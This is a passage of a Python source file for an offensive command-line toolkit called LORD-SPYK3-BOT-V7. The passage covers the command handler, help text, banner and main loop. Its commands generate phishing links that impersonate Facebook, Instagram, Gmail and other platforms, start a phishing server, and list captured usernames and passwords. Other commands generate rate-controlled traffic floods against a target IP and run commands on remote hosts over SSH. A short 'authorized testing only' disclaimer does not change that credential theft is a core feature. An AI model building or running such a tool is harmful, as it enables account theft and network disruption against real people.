        connections = self.ssh.get_connections()
        if not connections:
            return CommandResult(True, "No SSH connections configured.\nUse 'ssh_add <name> <host> <user> [password]' to add one.", 0)
        
        output = "SSH Connections:\n"
        for conn in connections:
            status = "✅" if conn['connected'] else "❌"
            output += f"  {status} {conn['name']} - {conn['host']}:{conn['port']} ({conn['username']})\n"
        return CommandResult(True, output, 0)
    
    def _ssh_add(self, args: List[str]) -> CommandResult:
        if len(args) < 3:
            return CommandResult(False, "Usage: ssh_add <name> <host> <username> [password]", 0)
        
        name, host, username = args[0], args[1], args[2]
        password = args[3] if len(args) > 3 else None
        
        conn = self.ssh.add_connection(name, host, username, password)
        return CommandResult(True, f"SSH connection added: {conn.name} (ID: {conn.id})", 0)
    
    def _ssh_connect(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: ssh_connect <name_or_id>", 0)
        
        identifier = args[0]
        
        # Find by name or ID
        conns = self.ssh.get_connections()
        conn = next((c for c in conns if c['name'] == identifier or c['id'] == identifier), None)
        
        if not conn:
            return CommandResult(False, f"Connection not found: {identifier}", 0)
        
        if self.ssh.connect(conn['id']):
            return CommandResult(True, f"Connected to {conn['name']} ({conn['host']})", 0)
        else:
            return CommandResult(False, f"Failed to connect to {conn['name']}", 0)
    
    def _ssh_exec(self, args: List[str]) -> CommandResult:
        if len(args) < 2:
            return CommandResult(False, "Usage: ssh_exec <name_or_id> <command>", 0)
        
        identifier = args[0]
        command = ' '.join(args[1:])
        
        # Find by name or ID
        conns = self.ssh.get_connections()
        conn = next((c for c in conns if c['name'] == identifier or c['id'] == identifier), None)
        
        if not conn:
            return CommandResult(False, f"Connection not found: {identifier}", 0)
        
        result = self.ssh.execute_command(conn['id'], command)
        
        if result.success:
            return CommandResult(True, result.output, result.execution_time)
        else:
            return CommandResult(False, result.error or "Command failed", result.execution_time)
    
    def _ssh_disconnect(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: ssh_disconnect <name_or_id>", 0)
        
        identifier = args[0]
        conns = self.ssh.get_connections()
        conn = next((c for c in conns if c['name'] == identifier or c['id'] == identifier), None)
        
        if not conn:
            return CommandResult(False, f"Connection not found: {identifier}", 0)
        
        self.ssh.disconnect(conn['id'])
        return CommandResult(True, f"Disconnected from {conn['name']}", 0)
    
    def _traffic(self, args: List[str]) -> CommandResult:
        if len(args) < 3:
            return CommandResult(False, "Usage: traffic <type> <ip> <duration> [port] [rate]", 0)
        
        traffic_type = args[0].lower()
        target_ip = args[1]
        
        try:
            duration = int(args[2])
        except:
            return CommandResult(False, f"Invalid duration: {args[2]}", 0)
        
        port = None
        if len(args) >= 4:
            try:
                port = int(args[3])
            except:
                pass
        
        rate = 100
        if len(args) >= 5:
            try:
                rate = int(args[4])
            except:
                pass
        
        try:
            generator = self.traffic.generate(traffic_type, target_ip, duration, port, rate)
            output = f"Traffic generation started:\n"
            output += f"  Type: {traffic_type}\n"
            output += f"  Target: {target_ip}\n"
            output += f"  Duration: {duration}s\n"
            output += f"  Rate: {rate}/s\n"
            output += f"  ID: {generator.id}"
            return CommandResult(True, output, 0)
        except Exception as e:
            return CommandResult(False, f"Failed: {e}", 0)
    
    def _traffic_types(self, args: List[str]) -> CommandResult:
        types = self.traffic.get_available_types()
        output = "Available traffic types:\n"
        for t in types:
            output += f"  • {t}\n"
        return CommandResult(True, output, 0)
    
    def _traffic_stop(self, args: List[str]) -> CommandResult:
        generator_id = args[0] if args else None
        if self.traffic.stop(generator_id):
            return CommandResult(True, "Traffic stopped" if not generator_id else f"Generator {generator_id} stopped", 0)
        else:
            return CommandResult(False, "Generator not found", 0)
    
    def _traffic_status(self, args: List[str]) -> CommandResult:
        active = self.traffic.get_active()
        if not active:
            return CommandResult(True, "No active traffic generators", 0)
        
        output = f"Active generators ({len(active)}):\n"
        for g in active:
            output += f"  • {g['id']}: {g['traffic_type']} to {g['target_ip']} ({g['packets_sent']} packets) - {g['status']}\n"
        return CommandResult(True, output, 0)
    
    def _nikto(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: nikto <target>", 0)
        
        result = self.nikto.scan(args[0])
        
        if result.success:
            output = f"Nikto scan of {result.target} completed in {result.scan_time:.1f}s\n"
            output += f"Vulnerabilities found: {len(result.vulnerabilities)}\n"
            if result.vulnerabilities:
                output += "Top vulnerabilities:\n"
                for v in result.vulnerabilities[:5]:
                    desc = v.get('description', '')[:100]
                    output += f"  • {desc}\n"
            return CommandResult(True, output, result.scan_time)
        else:
            return CommandResult(False, f"Scan failed: {result.error}", result.scan_time)
    
    def _nikto_full(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: nikto_full <target>", 0)
        
        result = self.nikto.scan(args[0], {'tuning': '123456789', 'ssl': True})
        
        if result.success:
            return CommandResult(True, f"Full Nikto scan completed: {len(result.vulnerabilities)} vulnerabilities found", result.scan_time)
        else:
            return CommandResult(False, f"Scan failed: {result.error}", result.scan_time)
    
    def _phish(self, platform: str) -> CommandResult:
        result = self.social.generate_phishing_link(platform)
        if result['success']:
            output = f"Phishing link generated:\n"
            output += f"  Platform: {platform}\n"
            output += f"  Link ID: {result['link_id']}\n"
            output += f"  URL: {result['phishing_url']}\n"
            output += f"\nTo start server: phish_start {result['link_id']}"
            return CommandResult(True, output, 0)
        else:
            return CommandResult(False, "Failed to generate phishing link", 0)
    
    def _phish_start(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: phish_start <link_id> [port]", 0)
        
        link_id = args[0]
        port = int(args[1]) if len(args) > 1 else self.config.get('social_engineering.default_port', 8080)
        
        if self.social.start_server(link_id, port):
            return CommandResult(True, f"Phishing server started on port {port}", 0)
        else:
            return CommandResult(False, f"Failed to start server for link {link_id}", 0)
    
    def _phish_stop(self, args: List[str]) -> CommandResult:
        self.social.stop_server()
        return CommandResult(True, "Phishing server stopped", 0)
    
    def _phish_creds(self, args: List[str]) -> CommandResult:
        link_id = args[0] if args else None
        creds = self.social.get_captured_credentials(link_id)
        
        if not creds:
            return CommandResult(True, "No captured credentials found", 0)
        
        output = f"Captured credentials ({len(creds)}):\n"
        for c in creds[:10]:
            output += f"  • {c['timestamp'][:19]} - {c['username']} / {c['password']} (from {c['ip_address']})\n"
        return CommandResult(True, output, 0)
    
    def _add_ip(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: add_ip <ip> [notes]", 0)
        
        ip = args[0]
        notes = ' '.join(args[1:]) if len(args) > 1 else ""
        
        if self.db.add_managed_ip(ip, "cli", notes):
            return CommandResult(True, f"IP {ip} added to monitoring", 0)
        else:
            return CommandResult(False, f"Failed to add IP {ip}", 0)
    
    def _remove_ip(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: remove_ip <ip>", 0)
        
        ip = args[0]
        ips = self.db.get_managed_ips()
        if any(i['ip_address'] == ip for i in ips):
            self.db.conn.execute("DELETE FROM managed_ips WHERE ip_address = ?", (ip,))
            self.db.conn.commit()
            return CommandResult(True, f"IP {ip} removed from monitoring", 0)
        else:
            return CommandResult(False, f"IP {ip} not found", 0)
    
    def _block_ip(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: block_ip <ip> [reason]", 0)
        
        ip = args[0]
        reason = ' '.join(args[1:]) if len(args) > 1 else "Manually blocked"
        
        if self.db.block_ip(ip, reason):
            # Try to block via firewall
            try:
                if platform.system().lower() == 'linux':
                    subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'], 
                                 capture_output=True, timeout=5)
            except:
                pass
            return CommandResult(True, f"IP {ip} blocked", 0)
        else:
            return CommandResult(False, f"Failed to block IP {ip}", 0)
    
    def _unblock_ip(self, args: List[str]) -> CommandResult:
        if not args:
            return CommandResult(False, "Usage: unblock_ip <ip>", 0)
        
        ip = args[0]
        
        if self.db.unblock_ip(ip):
            # Try to unblock from firewall
            try:
                if platform.system().lower() == 'linux':
                    subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                                 capture_output=True, timeout=5)
            except:
                pass
            return CommandResult(True, f"IP {ip} unblocked", 0)
        else:
            return CommandResult(False, f"IP {ip} not found or not blocked", 0)
    
    def _list_ips(self, args: List[str]) -> CommandResult:
        include_blocked = not (args and args[0] == 'active')
        ips = self.db.get_managed_ips(include_blocked)
        
        if not ips:
            return CommandResult(True, "No managed IPs found", 0)
        
        output = f"Managed IPs ({len(ips)}):\n"
        for ip in ips:
            status = "🔒" if ip['is_blocked'] else "✓"
            output += f"  {status} {ip['ip_address']} - {ip.get('notes', '')[:30]}\n"
        return CommandResult(True, output, 0)
    
    def _status(self, args: List[str]) -> CommandResult:
        stats = self.db.get_statistics()
        active_traffic = len(self.traffic.get_active())
        ssh_connections = len(self.ssh.get_connections())
        ssh_active = len([c for c in self.ssh.get_connections() if c.get('connected')])
        
        output = f"System Status:\n"
        output += f"  Total Commands: {stats.get('total_commands', 0)}\n"
        output += f"  Total Threats: {stats.get('total_threats', 0)}\n"
        output += f"  Total Scans: {stats.get('total_scans', 0)}\n"
        output += f"  Managed IPs: {stats.get('total_managed_ips', 0)} ({stats.get('blocked_ips', 0)} blocked)\n"
        output += f"  Traffic Generators: {active_traffic} active\n"
        output += f"  SSH Connections: {ssh_active}/{ssh_connections} active\n"
        output += f"  Phishing Links: {stats.get('total_phishing_links', 0)}\n"
        output += f"  Captured Credentials: {stats.get('captured_credentials', 0)}\n"
        
        return CommandResult(True, output, 0)
    
    def _history(self, args: List[str]) -> CommandResult:
        limit = int(args[0]) if args and args[0].isdigit() else 20
        
        rows = self.db.conn.execute(
            "SELECT command, source, timestamp, success FROM command_history ORDER BY timestamp DESC LIMIT ?",
            (limit,)
        ).fetchall()
        
        if not rows:
            return CommandResult(True, "No command history", 0)
        
        output = f"Command History (last {len(rows)}):\n"
        for row in rows:
            status = "✅" if row['success'] else "❌"
            output += f"  {status} [{row['timestamp'][:19]}] {row['command'][:50]}\n"
        return CommandResult(True, output, 0)
    
    def _help(self, args: List[str]) -> CommandResult:
        help_text = """
🕷️ LORD-SPYK3-BOT-V7 COMMANDS 🕷️

🔍 IP ANALYSIS:
  analyze <ip>           - Complete IP analysis with report
  ipinfo <ip>            - IP geolocation info

🔌 SSH COMMANDS:
  ssh                    - List SSH connections
  ssh_add <name> <host> <user> [pass] - Add SSH connection
  ssh_connect <name>     - Connect to server
  ssh_exec <name> <cmd>  - Execute command on server
  ssh_disconnect <name>  - Disconnect from server

🚀 TRAFFIC GENERATION:
  traffic <type> <ip> <duration> [port] [rate] - Generate traffic
  traffic_types         - List available traffic types
  traffic_status        - Show active generators
  traffic_stop [id]     - Stop traffic generation

🕷️ NIKTO SCANNER:
  nikto <target>        - Basic web vulnerability scan
  nikto_full <target>   - Full scan with all tests

🎣 SOCIAL ENGINEERING:
  phish_facebook        - Generate Facebook phishing link
  phish_instagram       - Generate Instagram phishing link
  phish_twitter         - Generate Twitter phishing link
  phish_gmail           - Generate Gmail phishing link
  phish_linkedin        - Generate LinkedIn phishing link
  phish_start <id> [port] - Start phishing server
  phish_stop            - Stop phishing server
  phish_creds [id]      - View captured credentials

🔒 IP MANAGEMENT:
  add_ip <ip> [notes]   - Add IP to monitoring
  remove_ip <ip>        - Remove IP from monitoring
  block_ip <ip> [reason] - Block IP address
  unblock_ip <ip>       - Unblock IP address
  list_ips [active]     - List managed IPs

📊 SYSTEM:
  status                - Show system status
  history [limit]       - Show command history
  clear                 - Clear screen
  help                  - Show this help

Examples:
  analyze 8.8.8.8
  traffic icmp 192.168.1.1 10
  ssh_add myserver 192.168.1.100 root password123
  ssh_exec myserver "ls -la"
  phish_facebook
  phish_start abc12345 8080
  add_ip 10.0.0.5 Suspicious
  block_ip 192.168.1.100 Port scanning

⚠️ For authorized security testing only
"""
        return CommandResult(True, help_text, 0)
    
    def _clear(self, args: List[str]) -> CommandResult:
        os.system('cls' if os.name == 'nt' else 'clear')
        return CommandResult(True, "", 0)

# =====================
# MAIN APPLICATION
# =====================
class Spyk3Bot:
    """Main application class"""
    
    def __init__(self):
        self.config = ConfigManager()
        self.db = DatabaseManager()
        self.ssh = SSHManager(self.db, self.config)
        self.traffic = TrafficGeneratorEngine(self.db, self.config)
        self.ip_engine = IPAnalysisEngine(self.db, self.config)
        self.nikto = NiktoScanner(self.db, self.config)
        self.social = SocialEngineeringTools(self.db, self.config)
        self.report_gen = ReportGenerator()
        self.handler = CommandHandler(
            self.db, self.ssh, self.traffic, self.ip_engine,
            self.nikto, self.social, self.report_gen, self.config
        )
        self.running = True
        self.session_id = str(uuid.uuid4())[:8]
    
    def print_banner(self):
        """Print application banner"""
        banner = f"""
{Colors.PURPLE_DARK}╔═══════════════════════════════════════════════════════════════════════╗
║{Colors.PURPLE_MEDIUM}                                                                           {Colors.PURPLE_DARK}║
║{Colors.PURPLE_LIGHT}                     🕷️ {Colors.PURPLE_MEDIUM}LORD-SPYK3-BOT-V7{Colors.PURPLE_LIGHT}                         {Colors.PURPLE_DARK}║
║{Colors.PURPLE_MEDIUM}                                                                           {Colors.PURPLE_DARK}║
║{Colors.PURPLE_MEDIUM}                     {Colors.WHITE}Cybersecurity Platform{Colors.PURPLE_MEDIUM}                     {Colors.PURPLE_DARK}║
║{Colors.PURPLE_MEDIUM}                                                                           {Colors.PURPLE_DARK}║
╠═══════════════════════════════════════════════════════════════════════════╣
║{Colors.GREEN}  FEATURES:                                                              {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • analyze <ip> - Complete IP analysis with reports                    {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • ssh <commands> - Remote SSH command execution                      {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • traffic - REAL network traffic generation                          {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • nikto <target> - Web vulnerability scanning                        {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • phish_* - Social engineering tools                                 {Colors.PURPLE_DARK}║
║{Colors.GREEN}  • IP Management - Block/unblock IPs                                  {Colors.PURPLE_DARK}║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}💡 Type 'help' for commands | Session: {self.session_id}{Colors.RESET}
        """
        print(banner)
    
    def check_deps(self):
        """Check dependencies"""
        print(f"\n{Colors.CYAN}🔍 Checking dependencies...{Colors.RESET}")
        
        deps = [
            ('paramiko', PARAMIKO_AVAILABLE, 'pip install paramiko'),
            ('scapy', SCAPY_AVAILABLE, 'pip install scapy'),
            ('matplotlib', GRAPHICS_AVAILABLE, 'pip install matplotlib'),
            ('reportlab', PDF_AVAILABLE, 'pip install reportlab'),
            ('discord.py', DISCORD_AVAILABLE, 'pip install discord.py'),
            ('telethon', TELETHON_AVAILABLE, 'pip install telethon')
        ]
        
        for name, available, install_cmd in deps:
            status = f"{Colors.GREEN}✅" if available else f"{Colors.YELLOW}⚠️"
            print(f"  {status} {name}")
            if not available:
                print(f"     Install: {install_cmd}")
        
        # Check system tools
        tools = ['ping', 'nmap', 'nikto']
        print(f"\n{Colors.CYAN}🔧 System tools:{Colors.RESET}")
        for tool in tools:
            found = shutil.which(tool) is not None
            status = f"{Colors.GREEN}✅" if found else f"{Colors.YELLOW}⚠️"
            print(f"  {status} {tool}")
        
        print()
    
    def run(self):
        """Main application loop"""
        os.system('cls' if os.name == 'nt' else 'clear')
        self.print_banner()
        self.check_deps()
        
        # Create directories
        for d in ['reports', 'nikto_results']:
            Path(d).mkdir(exist_ok=True)
        
        print(f"{Colors.GREEN}✅ Ready! Type 'help' for commands{Colors.RESET}")
        print()
        
        while self.running:
            try:
                prompt = f"{Colors.PURPLE_MEDIUM}[{Colors.PURPLE_LIGHT}{self.session_id}{Colors.PURPLE_MEDIUM}]{Colors.RESET} "
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                result = self.handler.execute(command)
                
                if result.output:
                    print(result.output)
                
                if result.success:
                    print(f"{Colors.GREEN}✅ Done ({result.execution_time:.2f}s){Colors.RESET}")
                else:
                    print(f"{Colors.RED}❌ Failed: {result.output}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}👋 Goodbye!{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.RED}❌ Error: {e}{Colors.RESET}")
        
        self.ssh.disconnect_all()
        self.traffic.stop()
        self.db.close()
        print(f"\n{Colors.GREEN}✅ Shutdown complete.{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    """Main entry point"""
    try:
        if sys.version_info < (3, 7):
            print("❌ Python 3.7 or higher required")
            sys.exit(1)
        
        app = Spyk3Bot()
        app.run()
        
    except KeyboardInterrupt:
        print("\n👋 Goodbye!")
    except Exception as e:
        print(f"\n❌ Fatal error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()